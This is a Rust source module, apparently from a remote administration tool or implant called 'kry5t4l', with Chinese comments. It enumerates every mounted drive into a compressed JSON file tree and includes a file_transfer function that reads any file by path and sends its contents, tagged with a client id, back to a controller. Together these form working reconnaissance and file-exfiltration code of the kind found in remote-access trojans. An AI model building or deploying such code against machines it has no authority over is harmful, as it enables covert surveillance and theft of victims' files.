use std::{collections::HashMap, ffi::OsStr, fs::File, io::{self, Read, Write}};
use chrono::{DateTime, Local};
use flate2::write::ZlibEncoder;
use flate2::Compression;
use kry5t4l_share::modules::{protocol::{FileTransfer, Message}, CommandType};
use walkdir::WalkDir;
use serde::{Serialize, Deserialize};
use std::path::PathBuf;
use sysinfo::Disks;
use rayon::prelude::*;


pub struct FileManager;


#[derive(Debug, Serialize, Deserialize)]
pub struct FileEntry {
    pub name: String,
    pub dir: bool,
    pub size: Option<String>,
    pub modified: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")] // 如果为空，则不序列化
    pub son: Vec<FileEntry>,
}

impl FileManager {
    
    fn create_file_entry(entry: &walkdir::DirEntry) -> Option<FileEntry> {
        let name = entry.file_name().to_string_lossy().into_owned();

        let metadata = match entry.metadata() {
            Ok(meta) => meta,
            Err(_) => return None, // 跳过权限不足的文件
        };

        let dir = metadata.is_dir();

        //格式化文件大小
        let size = if dir {
            None
        } else {
            let bytes = metadata.len();
            let kb = (bytes as f64 / 1024.0).max(1.0);
            Some(format!("{:.1}KB", kb))
        };

        //格式化修改时间
        let modified = metadata.modified().ok().and_then(
            |time| {
                let datetime: DateTime<Local> = time.into();
                Some(datetime.format("%Y/%m/%d %H:%M").to_string())
            }
        );

        Some(FileEntry {
            name,
            dir,
            size,
            modified,
            son: Vec::new(),
        })
    }

    pub fn traverse_path(root_path: &str) -> Result<FileEntry, io::Error> {
        let root_path_buf = PathBuf::from(root_path);
        let mut entry_map: HashMap<PathBuf, FileEntry> = HashMap::new();
        let mut children_map: HashMap<PathBuf, Vec<PathBuf>> = HashMap::new();

        // 收集所有条目
        for entry in WalkDir::new(&root_path_buf)
            .min_depth(0)
            .into_iter()
            .filter_map(|e| e.ok()) {
            if let Some(file_entry) = Self::create_file_entry(&entry) {
                let path = entry.path().to_path_buf();
                entry_map.insert(path.clone(), file_entry);
                
                // 记录父子关系
                if let Some(parent) = path.parent() {
                    children_map.entry(parent.to_path_buf())
                        .or_default()
                        .push(path);
                }
            }
        }

        // 按深度降序处理节点（从叶子节点开始）
        let mut paths: Vec<_> = entry_map.keys().cloned().collect();
        paths.sort_by_key(|path| -(path.components().count() as i64));

        // 构建树状结构
        for path in paths {
            if let Some(children) = children_map.get(&path) {
                // 先收集所有子节点
                let mut child_entries = Vec::new();
                for child_path in children {
                    if let Some(child_entry) = entry_map.remove(child_path) {
                        child_entries.push(child_entry);
                    }
                }
                
                // 然后将子节点添加到父节点
                if let Some(parent_entry) = entry_map.get_mut(&path) {
                    parent_entry.son = child_entries;
                }
            }
        }

        // 返回根节点
        entry_map.remove(&root_path_buf)
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "Root entry not found"))
    }

    pub fn get_all_file_entries_as_json() -> Result<String, io::Error> {
        let disks = Disks::new_with_refreshed_list();

        let all_drive_entries: Vec<_> = disks
            .list()
            .par_iter() // 使用 par_iter() 进行并行迭代
            .filter_map(|disk| {
                let mount_point = disk.mount_point();
                if mount_point.is_dir() {
                    let drive_path = mount_point.to_string_lossy().to_string();
                    println!("Scanning drive: {}", drive_path);

                    match Self::traverse_path(&drive_path) {
                        Ok(root_entry) => Some(root_entry),
                        Err(e) => {
                            eprintln!("Error scanning drive {}: {}", drive_path, e);
                            None
                        }
                    }
                } else {
                    None
                }
            })
            .collect(); // 将并行迭代的结果收集到 Vec 中

        serde_json::to_string(&all_drive_entries)
            .map_err(|e| io::Error::new(io::ErrorKind::Other, format!("JSON error: {}", e)))
    }
}

pub fn start_get_file_info_thread() {
    std::thread::spawn(move || {
        if let Ok(json_string) = FileManager::get_all_file_entries_as_json() {
                let filename = "./filejson";
                let file = File::create(filename).unwrap();

                let mut e = ZlibEncoder::new(file, Compression::default());
                let _ = e.write_all(json_string.as_bytes());
                let _ = e.finish();
                println!("Success ./filejson");
            }
        }
    );
}


pub fn file_transfer(src_path: String, dst_path: String, cmd_type: CommandType, clientid: String, sender: std::sync::mpsc::Sender<Vec<u8>>) {
    std::thread::spawn(move || {
        let mut file_data = Vec::new();
        let mut status = String::from("Success");

        match File::open(&src_path) {
            Ok(mut file) => {
                if let Err(e) = file.read_to_end(&mut file_data) {
                    status = format!("Error: {}", e);
                    file_data.clear();
                }
            }
            Err(e) => {
                status = format!("Error: {}", e);
            }
        };

        let ft = FileTransfer {
            src_path,
            dst_path,
            file_size: file_data.len() as u64,
            file_data,
            status,
        };

        if let Some(packet) = Message::to_bytes(cmd_type.to_u8(), &clientid, &ft.to_bytes()).ok() {
            if sender.send(packet).is_err() {
                eprintln!("channel closed");
            }
        }
    });
}


pub fn generate_unique_filename(mut path: PathBuf) -> PathBuf {
    let original_path = path.clone();
    let mut counter = 1;
    
    while path.exists() {
        let stem = original_path.file_stem().unwrap_or(OsStr::new("file"));
        let extension = original_path.extension();
        
        let new_filename = if let Some(ext) = extension {
            format!("{}({}).{}", stem.to_string_lossy(), counter, ext.to_string_lossy())
        } else {
            format!("{}({})", stem.to_string_lossy(), counter)
        };
        
        path = original_path.with_file_name(new_filename);
        counter += 1;
    }
    
    path
}